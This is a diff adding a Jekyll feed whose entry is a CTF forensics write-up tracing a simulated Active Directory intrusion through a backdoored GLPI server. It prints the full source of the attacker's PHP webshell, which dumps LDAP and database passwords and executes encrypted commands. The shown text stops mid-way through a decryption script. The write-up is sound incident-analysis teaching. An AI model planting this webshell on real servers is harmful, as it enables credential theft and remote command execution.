@@ -1,0 +1,869 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-12-23T15:58:44+07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Jaysen’s Cybersecurity Notes</title><subtitle>A personal technical blog documenting my journey as a Computer Science student, covering cybersecurity, CTF write-ups, digital forensics, reverse engineering, and hands-on security research.
+</subtitle><author><name>Jaysen</name></author><entry><title type="html">Operation Pensieve Breach - heroCTF v7</title><link href="http://localhost:4000/heroctfv9-full-forensics/" rel="alternate" type="text/html" title="Operation Pensieve Breach - heroCTF v7" /><published>2025-12-23T00:00:00+07:00</published><updated>2025-12-23T00:00:00+07:00</updated><id>http://localhost:4000/heroctfv9-full-forensics</id><content type="html" xml:base="http://localhost:4000/heroctfv9-full-forensics/"><![CDATA[<p>About a month ago, I participated in heroCTF v7 with my team, CSUI, where we finished 9th overall and successfully solved all forensic challenges. I personally handled most of the forensic tracks, which turned out to be among the most enjoyable and realistic CTF challenges I have experienced so far.</p>
+
+<p>This challenge series is based on real-world engagements, including both penetration testing and red team operations, as stated by the challenge author. This realism is clearly reflected in the attack flow, which closely resembles an actual enterprise intrusion and requires a DFIR-style investigation rather than isolated exploitation steps. In this post, I will share the full forensic write-up of <em>Operation Pensieve Breach</em>, covering the complete attack timeline from the initial access and lateral movement to privilege escalation, credential theft, and domain compromise based entirely on evidence extracted from logs, disk artifacts, network traffic, and memory analysis.</p>
+
+<p>You can access the challange attachments and the official writeup <a href="https://github.com//assets/heroCTF//assets/heroCTF_v7/tree/master/Forensics">here</a></p>
+
+<h2 id="operation-pensieve-breach---1">Operation Pensieve Breach - 1</h2>
+
+<h3 id="attachment">Attachment</h3>
+<ul>
+  <li>ministry_winevt.7z</li>
+</ul>
+
+<h3 id="description">Description</h3>
+<p>The SOC of the Ministry of Magic received multiple critical alerts from the Domain Controller.</p>
+
+<p>Everything seems to be out of control.
+It seems that a critical user has been compromised and is performing nasty magic using the DCsync spell.</p>
+
+<p>You’re mandated to investigate the Principal Domain Controller event logs to find:</p>
+<ul>
+  <li>sAMAccountName (lowercase) of the compromised account performing bad stuff.</li>
+  <li>Timestamp of the beginning of the attack, format: DD/MM/YYYY-11:22:33 SystemTime.</li>
+  <li>Source IP address used for this attack.</li>
+  <li>The last legitimate IP used to login before the attack.</li>
+</ul>
+
+<p>The findings have to be separated by a “;”.<br />
+Here is an example flag format:
+<code class="language-plaintext highlighter-rouge">Hero{john.stark;DD/MM/YYYY-11:22:33;127.0.0.1;127.0.0.1}</code></p>
+
+<h3 id="identifying-the-dcsync-attack">Identifying the DCsync Attack</h3>
+<p>A DCsync attack can be detected by monitoring Event ID 4662, which records Directory Service Access operations. When this event contains directory replication-related permissions (such as DS-Replication-Get-Changes*), it may indicate a DCsync attack. The first occurrence of such an Event ID 4662 marks the beginning of the attack.
+(Source: https://www.fox-it.com/nl-en/defending-your-directory-an-expert-guide-to-securing-active-directory-against-dcsync-attacks/
+)</p>
+
+<p>For this analysis, Security.evtx was examined as the primary log source, as both Directory Service access events (Event ID 4662) and authentication events (Event ID 4624) are audited under Security Auditing and are required to identify the compromised account, determine the attack timeline, and correlate source IP addresses.
+(Source : https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l–events-to-monitor)</p>
+
+<h3 id="compromised-account-identification">Compromised Account Identification</h3>
+<p>By analyzing the first DCsync-related Event ID 4662, the account responsible for the malicious replication request can be identified.</p>
+
+<p>From the event details, the following compromised account was observed:
+<img src="/assets/heroCTF/1a.png" alt="alt text" />
+This confirms that the account <code class="language-plaintext highlighter-rouge">albus.dumbledore</code> was used to perform unauthorized directory replication.</p>
+
+<h3 id="attack-start-timestamp">Attack Start Timestamp</h3>
+<p>To determine when the attack began, the earliest DCsync-related Event ID 4662 was examined.</p>
+
+<p>The timestamp used is the SystemTime field, as it represents the authoritative event creation time and is not affected by local time display or synchronization offsets.
+<img src="/assets/heroCTF/1b.png" alt="alt text" />
+timestamp : <code class="language-plaintext highlighter-rouge">22/11/2025-23:13:41</code></p>
+
+<h3 id="source-ip-address-used-for-the-attack">Source IP Address Used for the Attack</h3>
+<p>Event ID 4662 does not always directly expose the source IP address.
+Therefore, event correlation with Event ID 4624 (Successful Logon) was performed for the same account and timeframe.</p>
+
+<p>By correlating the successful logon event associated with the DCsync activity, the following source IP was identified:
+<img src="/assets/heroCTF/1c.png" alt="alt text" />
+IP : <code class="language-plaintext highlighter-rouge">192.168.56.200</code></p>
+
+<h3 id="last-legitimate-login-ip-before-the-attack">Last Legitimate Login IP Before the Attack</h3>
+<p>To determine the last legitimate login prior to the compromise, Event ID 4624 entries for the compromised account were analyzed chronologically before the attack timestamp.</p>
+
+<p>The final successful logon before the DCsync activity originated from the following IP address:
+<img src="/assets/heroCTF/1d.png" alt="alt text" />
+IP : <code class="language-plaintext highlighter-rouge">192.168.56.230</code></p>
+
+<p>FLAG: <code class="language-plaintext highlighter-rouge">Hero{albus.dumbledore;22/11/2025-23:13:41;192.168.56.200;192.168.56.230}</code></p>
+
+<hr />
+
+<h2 id="operation-pensieve-breach---2">Operation Pensieve Breach - 2</h2>
+
+<h3 id="attachment-1">Attachment</h3>
+<ul>
+  <li>pensieve_var.7z</li>
+</ul>
+
+<h3 id="description-1">Description</h3>
+<p>The director of Hogwarts got his account compromised. The last time he logged on legitimately was from 192.168.56.230 (pensive.hogwarts.local).</p>
+
+<p>Investigate to identify how his account got compromised from this server. Please find the following information to go forward in this case:</p>
+<ul>
+  <li>Absolute path of the file which led to the compromise.</li>
+  <li>Absolute path of the file used by the attacker to retrieve Albus’ account.</li>
+  <li>The second file stores two pieces of information. The 3rd flag part is the value of the second field of the second piece of information.</li>
+</ul>
+
+<p>The findings have to be separated by a “;”. <br />
+Here is an example flag format:
+<code class="language-plaintext highlighter-rouge">Hero{/var/idk/file.ext;/var/idk/file.ext;AnExample?}</code></p>
+
+<h3 id="compromise-vector-analysis">Compromise Vector Analysis</h3>
+<p>We are provided with the var directory, which typically contains web applications and their associated logs.</p>
+
+<p>Upon inspection, a GLPI installation was found under: <code class="language-plaintext highlighter-rouge">/var/www/glpi</code>. GLPI is an IT Service Management (ITSM) application, commonly deployed in enterprise environments and often integrated with LDAP authentication. Due to its role in authentication handling, it became the primary focus of the investigation.</p>
+
+<p>To identify potentially malicious modifications, recently modified files within the GLPI directory were enumerated:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find /var/www/glpi <span class="nt">-type</span> f <span class="nt">-mtime</span> <span class="nt">-30</span> <span class="nt">-ls</span> | <span class="nb">sort</span> <span class="nt">-k11</span>
+</code></pre></div></div>
+<p>This revealed a suspicious file:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>281474977455951     72 <span class="nt">-rwxrwxrwx</span>   1 jay      jay         73231 Nov 23 06:10 ./var/www/glpi/src/Auth.php
+</code></pre></div></div>
+<p>The file permissions and recent modification timestamp strongly suggest unauthorized tampering.</p>
+
+<p>Upon reviewing Auth.php, a backdoor was identified.
+The file contains hardcoded cryptographic material used to encrypt user credentials during authentication attempts.
+<img src="/assets/heroCTF/2.png" alt="alt text" />
+Specifically:</p>
+<ul>
+  <li>User credentials are encrypted using AES-CBC</li>
+  <li>A hardcoded key and IV are used</li>
+  <li>The encrypted output is covertly stored inside a GIF file</li>
+</ul>
+
+<p>This behavior is not part of GLPI’s legitimate authentication flow and clearly indicates a credential-harvesting backdoor.</p>
+
+<h3 id="path-of-the-file-which-led-to-the-compromise">Path of the file which led to the compromise</h3>
+<p>The file responsible for the compromise is: <code class="language-plaintext highlighter-rouge">/var/www/glpi/src/Auth.php</code>.
+This file was modified to capture and encrypt user credentials, enabling the attacker to harvest login data.</p>
+
+<h3 id="path-of-the-file-used-by-the-attacker-to-retrieve-albus-account">Path of the file used by the attacker to retrieve Albus’ account</h3>
+<p>The encrypted credentials are stored inside a GIF file: <code class="language-plaintext highlighter-rouge">/var/www/glpi/pics/screenshots/example.gif</code>.
+This file acts as a covert storage medium for the harvested credentials, allowing the attacker to retrieve and decrypt them at a later time.</p>
+
+<h3 id="decrypting-stored-credentials">Decrypting Stored Credentials</h3>
+<p>The GIF file contains two encrypted credential entries, separated by a delimiter (;). Using the hardcoded key and IV found in Auth.php, the stored data was decrypted.</p>
+
+<p>Decryption Script:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">base64</span>
+<span class="kn">from</span> <span class="n">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+
+<span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">ec6c34408ae2523fe664bd1ccedc9c28</span><span class="sh">"</span>
+<span class="n">iv</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">ecb2b0364290d1df</span><span class="sh">"</span>
+
+<span class="n">data</span> <span class="o">=</span> <span class="sh">"""</span><span class="s">
+mbzTGN3mBbqOHr/h3/c2uebIG7VPft37SXR+hurPIglCYfLeFqIzSM/R9lLhKp5K;
+U+IiFdoC53E4vV+9aTeVHbsp/0YRYqDqQzvx0gBGpzIPAhEYlgd5SjpPPQOLgmmoCbWKLREBHparNdsK2BQ3tQ==;
+</span><span class="sh">"""</span>
+
+<span class="k">def</span> <span class="nf">unpad</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">s</span><span class="p">[:</span><span class="o">-</span><span class="n">s</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]]</span>
+
+<span class="n">ciphertexts</span> <span class="o">=</span> <span class="p">[</span><span class="n">x</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">data</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">;</span><span class="sh">"</span><span class="p">)</span> <span class="k">if</span> <span class="n">x</span><span class="p">.</span><span class="nf">strip</span><span class="p">()]</span>
+
+<span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">ct</span> <span class="ow">in</span> <span class="nf">enumerate</span><span class="p">(</span><span class="n">ciphertexts</span><span class="p">,</span> <span class="mi">1</span><span class="p">):</span>
+    <span class="n">raw</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="n">ct</span><span class="p">)</span>
+    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
+    <span class="n">decrypted</span> <span class="o">=</span> <span class="nf">unpad</span><span class="p">(</span><span class="n">cipher</span><span class="p">.</span><span class="nf">decrypt</span><span class="p">(</span><span class="n">raw</span><span class="p">))</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">] </span><span class="si">{</span><span class="n">decrypted</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="sh">'</span><span class="s">ignore</span><span class="sh">'</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+<p>Decryption Output :</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>1] <span class="o">{</span><span class="s2">"login"</span>:<span class="s2">"Flag"</span>,<span class="s2">"password"</span>:<span class="s2">"Hero{FakeFlag:(}"</span><span class="o">}</span>
+<span class="o">[</span>2] <span class="o">{</span><span class="s2">"login"</span>:<span class="s2">"albus.dumbledore"</span>,<span class="s2">"password"</span>:<span class="s2">"FawkesPhoenix#9!"</span><span class="o">}</span>
+</code></pre></div></div>
+<p>The second entry corresponds to Albus’ account.
+According to the challenge requirements, the third part of the flag is the value of the second field of the second entry, which is: <code class="language-plaintext highlighter-rouge">FawkesPhoenix#9!</code></p>
+
+<p>FLAG: <code class="language-plaintext highlighter-rouge">Hero{/var/www/glpi/src/Auth.php;/var/www/glpi/pics/screenshots/example.gif;FawkesPhoenix#9!}</code></p>
+
+<hr />
+
+<h2 id="operation-pensieve-breach---3">Operation Pensieve Breach - 3</h2>
+
+<h3 id="attachment-2">Attachment</h3>
+<ul>
+  <li>ministry_winevt.7z</li>
+  <li>pensieve_var.7z</li>
+</ul>
+
+<h3 id="description-2">Description</h3>
+<p>Now that you know how the attacker retrieved Albus’ credentials, understand how the attacker managed to perform the previous actions. Please find the following information about how he did this:</p>
+<ul>
+  <li>Absolute path of the left-over file used to backdoor the authentication.</li>
+  <li>Decoded identifier (without the flag wrapper) that the attacker encoded when registering the backdoor component.</li>
+  <li>ID of the CVE used.</li>
+  <li>sAMAccountName used to exploit the application.</li>
+  <li>Using Ministry’s log, what’s the last legitimate IP address used by this user before exploitation? (192.168.56.1 is out of scope).</li>
+</ul>
+
+<p>The findings have to be separated by a “;”. <br />
+Here is an example flag format:
+<code class="language-plaintext highlighter-rouge">Hero{/bin/bash;Decoded_IDENTIFIER_without_the_flag_wrapper;CVE-2025-12345;user.name;127.0.0.1}</code></p>
+
+<h3 id="investigation--attack-tracing">Investigation &amp; Attack Tracing</h3>
+<p>Based on the previous findings, the attacker’s IP address was 192.168.56.200.
+To reconstruct the attack chain, the web server logs were analyzed, focusing on requests originating from this IP address.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">grep</span> <span class="s2">"192.168.56.200"</span> <span class="k">*</span>
+</code></pre></div></div>
+<p>This revealed multiple suspicious requests, including file upload activity and subsequent access to sensitive files.
+<img src="/assets/heroCTF/3.png" alt="alt text" />
+From the logs, it is evident that the attacker:</p>
+<ul>
+  <li>Uploaded a file named <code class="language-plaintext highlighter-rouge">setup.php</code></li>
+  <li>Later accessed <code class="language-plaintext highlighter-rouge">example.gif</code>, which was previously identified as a file containing encrypted credentials</li>
+</ul>
+
+<p>The contents of <code class="language-plaintext highlighter-rouge">setup.php</code> are shown below :</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="cd">/****************************************************************
+ * Webshell Usage:
+ *   ?passwd=P@ssw0rd123 --&gt; Print glpi passwords in use
+ *   ?passwd=P@ssw0rd123&amp;_hidden_cmd=whoami --&gt; Execute whoami
+ *
+ * Used here exploits/utils/glpi_utils.py:method:get_glpi_shell
+ *
+ * ```bash
+ * python3 -c 'import zlib;import base64; shell = open("shell.php", "rb");print(base64.b64encode(zlib.compress(shell.read())));shell.close()'
+ * ```
+ ****************************************************************/</span>
+
+<span class="nb">error_reporting</span><span class="p">(</span><span class="kc">E_ERROR</span> <span class="o">|</span> <span class="kc">E_PARSE</span><span class="p">);</span>
+
+<span class="nv">$SECURITY_STRATEGY</span> <span class="o">=</span> <span class="s2">"no_check"</span><span class="p">;</span>
+
+<span class="k">function</span> <span class="n">title</span><span class="p">(</span><span class="nv">$m</span><span class="p">){</span>
+  <span class="k">echo</span> <span class="s2">"&lt;b&gt;&lt;u&gt;"</span> <span class="mf">.</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nb">ucfirst</span><span class="p">(</span><span class="nv">$m</span><span class="p">))</span> <span class="mf">.</span> <span class="s2">"&lt;/b&gt;&lt;/u&gt;&lt;/br&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="n">decrypt_pass</span><span class="p">(</span><span class="nv">$pass</span><span class="p">){</span>
+  <span class="k">if</span><span class="p">(</span><span class="nb">method_exists</span><span class="p">(</span><span class="s2">"GLPIKey"</span><span class="p">,</span> <span class="s2">"decrypt"</span><span class="p">)){</span>
+    <span class="k">return</span> <span class="p">(</span><span class="k">new</span> <span class="nc">GLPIKey</span><span class="p">())</span><span class="o">-&gt;</span><span class="nf">decrypt</span><span class="p">(</span><span class="nv">$pass</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nb">method_exists</span><span class="p">(</span><span class="s2">"Toolbox"</span><span class="p">,</span> <span class="s2">"decrypt"</span><span class="p">)){</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">method_exists</span><span class="p">(</span><span class="s2">"Toolbox"</span><span class="p">,</span> <span class="s2">"sodiumDecrypt"</span><span class="p">)){</span>
+      <span class="k">return</span> <span class="nc">Toolbox</span><span class="o">::</span><span class="nf">sodiumDecrypt</span><span class="p">(</span><span class="nv">$pass</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="c1">### Really old glpi decrypted with a key in the config</span>
+    <span class="k">return</span> <span class="nc">Toolbox</span><span class="o">::</span><span class="nf">decrypt</span><span class="p">(</span><span class="nv">$pass</span><span class="p">,</span> <span class="no">GLPIKEY</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="s2">"&lt;ENCRYPTED&gt;[</span><span class="si">{</span><span class="nv">$pass</span><span class="si">}</span><span class="s2">]"</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="n">dump_password</span><span class="p">(){</span>
+  <span class="k">global</span> <span class="nv">$CFG_GLPI</span><span class="p">,</span> <span class="nv">$DB</span><span class="p">;</span>
+
+  <span class="c1">### Show password informations</span>
+  <span class="c1"># Dump Proxy scheme</span>
+  <span class="c1"># Dump LDAP Password</span>
+  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$CFG_GLPI</span><span class="p">[</span><span class="s2">"proxy_name"</span><span class="p">]))</span>
+  <span class="p">{</span>
+    <span class="nv">$proxy_credz</span> <span class="o">=</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$CFG_GLPI</span><span class="p">[</span><span class="s2">"proxy_user"</span><span class="p">])</span><span class="o">?</span><span class="nv">$CFG_GLPI</span><span class="p">[</span><span class="s2">"proxy_user"</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">":"</span> <span class="mf">.</span> <span class="nf">decrypt_pass</span><span class="p">(</span><span class="nv">$CFG_GLPI</span><span class="p">[</span><span class="s2">"proxy_passwd"</span><span class="p">])</span> <span class="mf">.</span> <span class="s2">"@"</span><span class="o">:</span><span class="s2">""</span><span class="p">;</span>
+    <span class="nv">$proxy_url</span> <span class="o">=</span> <span class="s2">"http://</span><span class="si">{</span><span class="nv">$proxy_credz</span><span class="si">}</span><span class="s2">"</span> <span class="mf">.</span> <span class="nv">$CFG_GLPI</span><span class="p">[</span><span class="s1">'proxy_name'</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">":"</span> <span class="mf">.</span> <span class="nv">$CFG_GLPI</span><span class="p">[</span><span class="s1">'proxy_port'</span><span class="p">];</span>
+    <span class="nf">title</span><span class="p">(</span><span class="s2">"proxy:"</span><span class="p">);</span>
+    <span class="nc">Html</span><span class="o">::</span><span class="nf">printCleanArray</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">"Proxy In Use"</span> <span class="o">=&gt;</span> <span class="nv">$proxy_url</span><span class="p">));</span>
+  <span class="p">}</span>
+  <span class="nv">$auth_methods</span> <span class="o">=</span> <span class="nc">Auth</span><span class="o">::</span><span class="nf">getLoginAuthMethods</span><span class="p">();</span>
+
+  <span class="nv">$config_ldap</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">AuthLDAP</span><span class="p">();</span>
+  <span class="nv">$all_connections</span> <span class="o">=</span> <span class="nv">$config_ldap</span><span class="o">-&gt;</span><span class="nf">find</span><span class="p">();</span>
+
+  <span class="k">foreach</span><span class="p">(</span><span class="nv">$all_connections</span> <span class="k">as</span> <span class="nv">$connection</span><span class="p">){</span>
+    <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$connection</span><span class="p">[</span><span class="s1">'rootdn_passwd'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$connection</span><span class="p">[</span><span class="s1">'rootdn'</span><span class="p">])){</span>
+      <span class="nv">$ldap_pass</span> <span class="o">=</span> <span class="nf">decrypt_pass</span><span class="p">(</span><span class="nv">$connection</span><span class="p">[</span><span class="s1">'rootdn_passwd'</span><span class="p">]);</span>
+      <span class="nf">title</span><span class="p">(</span><span class="s2">"Ldap Connexion:"</span><span class="p">);</span>
+      <span class="nc">Html</span><span class="o">::</span><span class="nf">printCleanArray</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">"LDAP Base"</span> <span class="o">=&gt;</span> <span class="nv">$connection</span><span class="p">[</span><span class="s1">'rootdn'</span><span class="p">],</span> <span class="s2">"LDAP DN"</span> <span class="o">=&gt;</span> <span class="nv">$connection</span><span class="p">[</span><span class="s2">"basedn"</span><span class="p">],</span> <span class="s2">"LDAP Password"</span> <span class="o">=&gt;</span> <span class="nv">$ldap_pass</span><span class="p">,</span> <span class="s2">"Connection is active"</span> <span class="o">=&gt;</span> <span class="nv">$connection</span><span class="p">[</span><span class="s1">'is_active'</span><span class="p">]));</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+
+  <span class="c1"># Dump DB password</span>
+  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">is_null</span><span class="p">(</span><span class="nv">$DB</span><span class="p">)){</span>
+    <span class="nf">title</span><span class="p">(</span><span class="s2">"Database informations:"</span><span class="p">);</span>
+    <span class="nc">Html</span><span class="o">::</span><span class="nf">printCleanArray</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">"DB Host"</span> <span class="o">=&gt;</span> <span class="nv">$DB</span><span class="o">-&gt;</span><span class="n">dbhost</span><span class="p">,</span>
+                                <span class="s2">"DB Database"</span> <span class="o">=&gt;</span> <span class="nv">$DB</span><span class="o">-&gt;</span><span class="n">dbdefault</span><span class="p">,</span>
+                                <span class="s2">"DB User"</span> <span class="o">=&gt;</span> <span class="nv">$DB</span><span class="o">-&gt;</span><span class="n">dbuser</span><span class="p">,</span>
+                                <span class="s2">"DB Password"</span> <span class="o">=&gt;</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$DB</span><span class="o">-&gt;</span><span class="n">dbpassword</span><span class="p">)));</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"submit_form"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"submit_form"</span><span class="p">]</span> <span class="o">===</span> <span class="s2">"2b01d9d592da55cca64dd7804bc295e6e03b5df4"</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$relative</span> <span class="o">=</span> <span class="nb">str_repeat</span><span class="p">(</span><span class="s2">"../"</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span>
+
+    <span class="nv">$to_include</span> <span class="o">=</span> <span class="s2">"</span><span class="si">{</span><span class="nv">$relative</span><span class="si">}</span><span class="s2">inc/includes.php"</span><span class="p">;</span>
+
+
+    <span class="k">if</span><span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$to_include</span><span class="p">)){</span>
+      <span class="k">include_once</span><span class="p">(</span><span class="nv">$to_include</span><span class="p">);</span>
+      <span class="k">try</span><span class="p">{</span>
+        <span class="nc">Html</span><span class="o">::</span><span class="nb">header</span><span class="p">(</span><span class="s2">"GLPI Password"</span><span class="p">);</span>
+
+        <span class="nv">$key</span> <span class="o">=</span> <span class="s2">"14ac4b90bd3f880e741a85b0c6254d1f"</span><span class="p">;</span>
+        <span class="nv">$iv</span>  <span class="o">=</span> <span class="s2">"5cf025270d8f74c9"</span><span class="p">;</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"save_result"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"save_result"</span><span class="p">]))</span>
+        <span class="p">{</span>
+          <span class="nv">$output</span><span class="o">=</span><span class="kc">null</span><span class="p">;</span>
+          <span class="nv">$retval</span><span class="o">=</span><span class="kc">null</span><span class="p">;</span>
+
+          <span class="nv">$encrypted</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'save_result'</span><span class="p">]);</span>
+          <span class="nv">$decrypted</span> <span class="o">=</span> <span class="nb">openssl_decrypt</span><span class="p">(</span><span class="nv">$encrypted</span><span class="p">,</span> <span class="s2">"AES-256-CBC"</span><span class="p">,</span> <span class="nv">$key</span><span class="p">,</span> <span class="no">OPENSSL_RAW_DATA</span><span class="p">,</span> <span class="nv">$iv</span><span class="p">);</span>
+
+          <span class="nb">exec</span><span class="p">(</span><span class="nv">$decrypted</span><span class="p">,</span> <span class="nv">$output</span><span class="p">,</span> <span class="nv">$retval</span><span class="p">);</span>
+
+          <span class="k">echo</span> <span class="s2">"&lt;code&gt;"</span><span class="p">;</span>
+          <span class="k">foreach</span> <span class="p">(</span><span class="nv">$output</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">echo</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$line</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">"&lt;/br&gt;"</span><span class="p">;</span>
+          <span class="p">}</span>
+          <span class="k">echo</span> <span class="s2">"&lt;/code&gt;&lt;/br&gt;"</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+          <span class="nf">dump_password</span><span class="p">();</span>
+        <span class="p">}</span>
+      <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nc">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="nf">getMessage</span><span class="p">();</span>
+      <span class="p">}</span>
+      <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>Analysis of the source code confirms that this file is a malicious webshell with the following capabilities:</p>
+<ul>
+  <li>Dumping sensitive credentials:</li>
+  <li>Executing arbitrary operating system commands via exec()</li>
+</ul>
+
+<p>The webshell is protected by a hardcoded access condition:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">if </span><span class="p">(</span><span class="nf">isset</span><span class="p">(</span><span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="sh">"</span><span class="s">submit_form</span><span class="sh">"</span><span class="p">])</span> 
+    <span class="o">&amp;&amp;</span> <span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="sh">"</span><span class="s">submit_form</span><span class="sh">"</span><span class="p">]</span> <span class="o">===</span> <span class="sh">"</span><span class="s">2b01d9d592da55cca64dd7804bc295e6e03b5df4</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+<p>This submit_form parameter acts as a shared secret, ensuring that only the attacker can activate the backdoor functionality.</p>
+
+<p>When this condition is met, the webshell allows command execution via the following endpoint:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/front/plugin.php?submit_form<span class="o">=</span>SECRET&amp;save_result<span class="o">=</span>COMMAND
+</code></pre></div></div>
+<p>Where <code class="language-plaintext highlighter-rouge">/front/plugin.php</code> is a legitimate GLPI plugin loader endpoint, SECRET must be the hardcoded value and the command is AES-encrypted, allowing attacker to bypass WAF. Then the encrypted command will be decrypted and executed on the system.</p>
+
+<p>To determine what actions were performed on the system, we could trace the request on the apache logs which containing <code class="language-plaintext highlighter-rouge">submit_form</code> parameter
+<img src="/assets/heroCTF/3a.png" alt="alt text" />
+These requests contain the encrypted payloads passed through the save_result parameter.</p>
+
+<p>decrypt.py</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">base64</span>
+<span class="kn">from</span> <span class="n">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+
+<span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">14ac4b90bd3f880e741a85b0c6254d1f</span><span class="sh">"</span>
+<span class="n">iv</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">5cf025270d8f74c9</span><span class="sh">"</span>
+
+<span class="n">data</span> <span class="o">=</span> <span class="sh">"""</span><span class="s">
+oGAHt/Kk1OKeXWxy7iXUfw==;
+4xRW8Us32tnzow8KiLOwuASwWypc4XE2LBDXaWQLmATmYOlVNcpYABK5gfF5xiwvLu1s6UpjuW2aJk94xSXQ1AaVGQFwdNpNR/7wqKV6JAE=;
+86AyGErKuj5UoZE9eHtlIg==
+</span><span class="sh">"""</span>
+
